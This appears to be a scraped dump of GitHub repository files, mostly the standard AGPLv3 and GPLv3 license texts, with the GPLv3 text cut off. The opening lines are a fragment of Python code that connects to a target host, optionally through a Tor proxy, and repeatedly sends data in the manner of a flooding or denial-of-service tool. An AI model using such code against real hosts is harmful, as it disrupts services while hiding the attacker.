term.BOL+term.UP+term.CLEAR_EOL+""Posting: %s"" % p+term.NORMAL             self.socks.send(p)             time.sleep(random.uniform(0.1, 3))          # self.socks.close()      def run(self):         while self.running:             while self.running:                 try:                     if self.tor:                         self.socks.set_proxy(socks.SOCKS5, \'127.0.0.1\', 9150)                         time.sleep(1)                     self.socks.connect((self.host, self.port))                     print term.BOL+term.UP+term.CLEAR_EOL+""Connected to host...""+ term.NORMAL                     break                 except Exception, e:                     print term.BOL+term.UP+term.CLEAR_EOL+""Error connecting to host",,2
0,https://github.com/minecraft77/blk-stealthspider.git,"                    GNU AFFERO GENERAL PUBLIC LICENSE                        Version 3, 19 November 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU Affero General Public License is a free, copyleft license for software and other kinds of works, specifically designed to ensure cooperation with the community in the case of network server software.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, our General Public Licenses are intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    Developers that use our General Public Licenses protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License which gives you legal permission to copy, distribute and/or modify the software.    A secondary benefit of defending all users\' freedom is that improvements made in alternate versions of the program, if they receive widespread use, become available for other developers to incorporate.  Many developers of free software are heartened and encouraged by the resulting cooperation.  However, in the case of software used on network servers, this result may fail to come about. The GNU General Public License permits making a modified version and letting the public access it on a server without ever releasing its source code to the public.    The GNU Affero General Public License is designed specifically to ensure that, in such cases, the modified source code becomes available to the community.  It requires the operator of a network server to provide the source code of the modified version running there to the users of that server.  Therefore, public use of a modified version, on a publicly accessible server, gives the public access to the source code of the modified version.    An older license, called the Affero General Public License and published by Affero, was designed to accomplish similar goals.  This is a different license, not a version of the Affero GPL, but Affero has released a new version of the Affero GPL which permits relicensing under this license.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU Affero General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Remote Network Interaction; Use with the GNU General Public License.    Notwithstanding any other provision of this License, if you modify the Program, your modified version must prominently offer all users interacting with it remotely through a computer network (if your version supports such interaction) an opportunity to receive the Corresponding Source of your version by providing access to the Corresponding Source from a network server at no charge, through some standard or customary means of facilitating copying of software.  This Corresponding Source shall include the Corresponding Source for any work covered by version 3 of the GNU General Public License that is incorporated pursuant to the following paragraph.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the work with which it is combined will remain governed by version 3 of the GNU General Public License.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU Affero General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU Affero General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU Affero General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU Affero General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU Affero General Public License as published     by the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU Affero General Public License for more details.      You should have received a copy of the GNU Affero General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If your software can interact with users remotely through a computer network, you should also make sure that it provides a way for users to get its source.  For example, if your program is a web application, its interface could display a ""Source"" link that leads users to an archive of the code.  There are many ways you could offer source, and different solutions will be better for different programs; see section 13 for the specific requirements.    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU AGPL, see <http://www.gnu.org/licenses/>.",,2
0,https://github.com/Noykarde/NoykardeRepository.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 3, 29 June 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU General Public License is a free, copyleft license for software and other kinds of works.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.  We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors.  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights.  Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you legal permission to copy, distribute and/or modify it.    For the developers\' and authors\' protection, the GPL clearly explains that there is no warranty for this free software.  For both users\' and authors\' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions.    Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so.  This is fundamentally incompatible with the aim of protecting users\' freedom to change the software.  The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable.  Therefore, we have designed this version of the GPL to prohibit the practice for those products.  If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users.    Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary.  To prevent this, the GPL assures that patents cannot be used to render the program non-free.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial 